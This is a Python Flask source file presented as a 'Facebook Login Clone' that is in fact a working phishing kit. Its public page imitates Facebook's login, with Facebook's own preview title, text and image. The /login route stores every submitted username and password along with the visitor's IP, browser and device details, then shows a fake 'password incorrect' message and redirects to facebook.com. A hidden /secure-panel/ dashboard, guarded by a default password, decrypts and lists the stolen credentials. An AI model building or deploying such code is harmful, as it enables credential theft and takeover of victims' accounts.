"""
Facebook Login Clone – Flask
Data is stored in SQLite (instance/data.db) so it survives restarts.
"""

import os
import json
import sqlite3
from datetime import datetime
from functools import wraps
from pathlib import Path

from cryptography.fernet import Fernet
from flask import (
    Flask, request, redirect, url_for,
    render_template, session, jsonify, g
)

# ── App setup ────────────────────────────────────────────────────────────────

app = Flask(__name__, instance_relative_config=True)

# Secret key – stable across restarts (read from env or instance/secret.txt)
_secret_file = Path(app.instance_path) / 'secret.txt'
_enc_file    = Path(app.instance_path) / 'enc.key'

os.makedirs(app.instance_path, exist_ok=True)

if not _secret_file.exists():
    _secret_file.write_text(os.urandom(32).hex())
if not _enc_file.exists():
    _enc_file.write_text(Fernet.generate_key().decode())

app.secret_key = os.environ.get('SECRET_KEY', _secret_file.read_text().strip())

ENCRYPTION_KEY = os.environ.get('ENCRYPTION_KEY', _enc_file.read_text().strip())
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')

fernet = Fernet(ENCRYPTION_KEY.encode() if isinstance(ENCRYPTION_KEY, str) else ENCRYPTION_KEY)

# ── Database ─────────────────────────────────────────────────────────────────

DB_PATH = Path(app.instance_path) / 'data.db'


def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(str(DB_PATH), detect_types=sqlite3.PARSE_DECLTYPES)
        g.db.row_factory = sqlite3.Row
        g.db.execute('PRAGMA journal_mode=WAL')
    return g.db


@app.teardown_appcontext
def close_db(e=None):
    db = g.pop('db', None)
    if db:
        db.close()


def init_db():
    db = sqlite3.connect(str(DB_PATH))
    db.execute('PRAGMA journal_mode=WAL')
    db.executescript("""
        CREATE TABLE IF NOT EXISTS captures (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            enc_user    TEXT NOT NULL,
            enc_pass    TEXT NOT NULL,
            ip          TEXT,
            user_agent  TEXT,
            referer     TEXT,
            language    TEXT,
            device      TEXT,
            platform    TEXT,
            screen      TEXT,
            created_at  TEXT NOT NULL
        );

        CREATE TABLE IF NOT EXISTS settings (
            key   TEXT PRIMARY KEY,
            value TEXT NOT NULL
        );
    """)
    # Default settings
    defaults = {
        'preview_title':       'Facebook – log in or sign up',
        'preview_description': 'Log into Facebook to start sharing and connecting with your friends, family, and people you know.',
        'preview_image_url':   'https://static.xx.fbcdn.net/rsrc.php/yB/r/83zWJdc6PJI.webp',
        'redirect_url':        'https://facebook.com',
    }
    for k, v in defaults.items():
        db.execute(
            'INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', (k, v)
        )
    db.commit()
    db.close()


# ── Helpers ──────────────────────────────────────────────────────────────────

def encrypt(text: str) -> str:
    return fernet.encrypt(text.encode()).decode()


def decrypt(token: str) -> str:
    try:
        return fernet.decrypt(token.encode()).decode()
    except Exception:
        return '[error]'


def get_setting(key: str, default: str = '') -> str:
    row = get_db().execute(
        'SELECT value FROM settings WHERE key=?', (key,)
    ).fetchone()
    return row['value'] if row else default


def set_setting(key: str, value: str):
    get_db().execute(
        'INSERT INTO settings (key, value) VALUES (?, ?) '
        'ON CONFLICT(key) DO UPDATE SET value=excluded.value',
        (key, value)
    )
    get_db().commit()


def get_ip():
    xff = request.headers.get('X-Forwarded-For', '')
    return xff.split(',')[0].strip() if xff else request.remote_addr


def detect_device(ua: str) -> str:
    return 'mobile' if any(
        k in ua.lower() for k in ('mobile', 'android', 'iphone', 'ipad', 'ipod')
    ) else 'desktop'


def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('admin'):
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated


# ── Public routes ─────────────────────────────────────────────────────────────

@app.route('/')
def index():
    cfg = {
        'preview_title':       get_setting('preview_title'),
        'preview_description': get_setting('preview_description'),
        'preview_image_url':   get_setting('preview_image_url'),
    }
    return render_template('index.html', **cfg)


@app.route('/login', methods=['POST'])
def login():
    data = request.get_json(silent=True) or {}

    username = (data.get('username') or '').strip()
    password = (data.get('password') or '').strip()

    if not username or not password:
        return jsonify(success=False, error='Please fill in all fields.')

    ua         = request.headers.get('User-Agent', '')
    device     = detect_device(ua)
    ip         = get_ip()
    referer    = request.referrer or ''
    language   = request.accept_languages.best or ''
    platform   = data.get('platform', '')
    screen     = data.get('screen_info', '')
    created_at = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

    get_db().execute(
        '''INSERT INTO captures
           (enc_user, enc_pass, ip, user_agent, referer, language,
            device, platform, screen, created_at)
           VALUES (?,?,?,?,?,?,?,?,?,?)''',
        (encrypt(username), encrypt(password), ip, ua, referer,
         language[:50], device, platform[:100], screen[:200], created_at)
    )
    get_db().commit()

    redirect_url = get_setting('redirect_url', 'https://facebook.com')
    return jsonify(
        success=False,
        error='The password you\'ve entered is incorrect. '
              'Forgotten password?',
        redirect=redirect_url,
        show_retry=True,
    )


# ── Admin routes ──────────────────────────────────────────────────────────────

@app.route('/secure-panel/', methods=['GET', 'POST'])
def admin_login():
    if session.get('admin'):
        return redirect(url_for('admin_dashboard'))
    error = None
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session.clear()
            session['admin'] = True
            session.permanent = False
            return redirect(url_for('admin_dashboard'))
        error = 'Wrong password.'
    return render_template('admin_login.html', error=error)


@app.route('/secure-panel/logout')
def admin_logout():
    session.clear()
    return redirect(url_for('admin_login'))


@app.route('/secure-panel/dashboard')
@admin_required
def admin_dashboard():
    db    = get_db()
    total = db.execute('SELECT COUNT(*) FROM captures').fetchone()[0]
    mob   = db.execute("SELECT COUNT(*) FROM captures WHERE device='mobile'").fetchone()[0]
    desk  = db.execute("SELECT COUNT(*) FROM captures WHERE device='desktop'").fetchone()[0]
    rows  = db.execute(
        'SELECT * FROM captures ORDER BY id DESC LIMIT 20'
    ).fetchall()

    logs = []
    for r in rows:
        logs.append({
            'id':        r['id'],
            'username':  decrypt(r['enc_user']),
            'password':  decrypt(r['enc_pass']),
            'ip':        r['ip'] or '',
            'device':    r['device'] or '',
            'platform':  r['platform'] or '',
            'user_agent':r['user_agent'] or '',
            'timestamp': r['created_at'],
            'language':  r['language'] or '',
            'screen':    r['screen'] or '',
            'referer':   r['referer'] or '',
        })

    cfg = {
        'preview_title':       get_setting('preview_title'),
        'preview_description': get_setting('preview_description'),
        'preview_image_url':   get_setting('preview_image_url'),
        'redirect_url':        get_setting('redirect_url'),
    }
    return render_template('admin_dashboard.html',
                           total=total, mobile=mob, desktop=desk,
                           logs=logs, cfg=cfg)


@app.route('/secure-panel/api/logs')
@admin_required
def api_logs():
    page     = max(1, int(request.args.get('page', 1)))
    per_page = min(500, int(request.args.get('per_page', 50)))
    offset   = (page - 1) * per_page
    db       = get_db()
    total    = db.execute('SELECT COUNT(*) FROM captures').fetchone()[0]
    rows     = db.execute(
        'SELECT * FROM captures ORDER BY id DESC LIMIT ? OFFSET ?',
        (per_page, offset)
    ).fetchall()

    logs = []
    for r in rows:
        logs.append({
            'id':        r['id'],
            'username':  decrypt(r['enc_user']),
            'password':  decrypt(r['enc_pass']),
            'ip':        r['ip'] or '',
            'device':    r['device'] or '',
            'platform':  r['platform'] or '',
            'user_agent':r['user_agent'] or '',
            'timestamp': r['created_at'],
            'language':  r['language'] or '',
            'screen':    r['screen'] or '',
            'referer':   r['referer'] or '',
        })
    return jsonify(logs=logs, total=total, page=page)


@app.route('/secure-panel/api/logs/<int:log_id>', methods=['DELETE'])
@admin_required
def api_delete_log(log_id):
    get_db().execute('DELETE FROM captures WHERE id=?', (log_id,))
    get_db().commit()
    return jsonify(success=True)


@app.route('/secure-panel/api/logs/clear', methods=['POST'])
@admin_required
def api_clear_logs():
    get_db().execute('DELETE FROM captures')
    get_db().commit()
    return jsonify(success=True)


@app.route('/secure-panel/api/settings', methods=['POST'])
@admin_required
def api_update_settings():
    data = request.get_json(silent=True) or {}
    allowed = ('preview_title', 'preview_description', 'preview_image_url', 'redirect_url')
    for k in allowed:
        if k in data:
            set_setting(k, str(data[k])[:500])
    return jsonify(success=True)


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == '__main__':
    init_db()
    app.run(debug=False)
